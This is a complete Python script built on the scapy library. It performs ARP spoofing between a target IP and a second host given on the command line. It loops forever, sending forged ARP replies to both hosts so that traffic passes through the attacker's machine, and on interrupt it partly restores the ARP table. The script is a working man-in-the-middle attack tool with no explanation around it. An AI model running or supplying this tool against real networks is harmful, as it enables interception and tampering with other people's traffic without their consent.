#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import argparse

parser=argparse.ArgumentParser()
parser.add_argument("-t","--target",dest="tip",help="target_ip")
parser.add_argument("-s","--spoof",dest="sip",help="spoof_ip")
options = parser.parse_args()

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof():
    target_mac=get_mac(options.tip)
    packet = scapy.ARP(op=2 ,pdst = options.tip,hwdst=target_mac,psrc=options.sip)
    scapy.send(packet , verbose = False )

def spoof2():
    target_mac=get_mac(options.sip)
    packet = scapy.ARP(op=2 ,pdst = options.sip,hwdst=target_mac,psrc=options.tip)
    scapy.send(packet , verbose = False )

def restore():
    destination_mac= get_mac(options.tip)
    source_mac= get_mac(options.sip)
    packet = scapy.ARP(op=2, pdst=options.tip, hwdst=destination_mac, psrc=options.sip, hwsrc=source_mac )
    scapy.send(packet , count=4, verbose=False)



try:
    sent_packet_count = 0
    while True:
        spoof()
        spoof2()
        sent_packet_count = sent_packet_count +2
        print("\r[+] packets sent :" + str(sent_packet_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Ctrl+c detected ..... wait to reset ARP table.")
    restore()
